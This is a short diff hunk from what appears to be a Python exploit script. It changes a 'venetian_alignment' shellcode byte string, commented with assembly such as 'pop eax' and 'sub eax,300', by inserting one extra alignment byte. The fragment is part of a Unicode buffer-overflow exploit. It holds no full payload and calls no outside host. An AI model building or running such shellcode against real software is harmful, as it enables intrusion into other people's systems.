@@ -59,7 +59,8 @@ venetian_alignment = (
 "\x47" 					                            #align
 "\x58" 					                            #pop eax
 "\x47"                                  #align
-"\x05\x28\x11" 	                         
+"\x47"
+ "\x05\x28\x11" 	                         
 "\x47"					                             #align
 "\x2d\x13\x11"	                         #sub eax,300
 "\x47"					                             #align
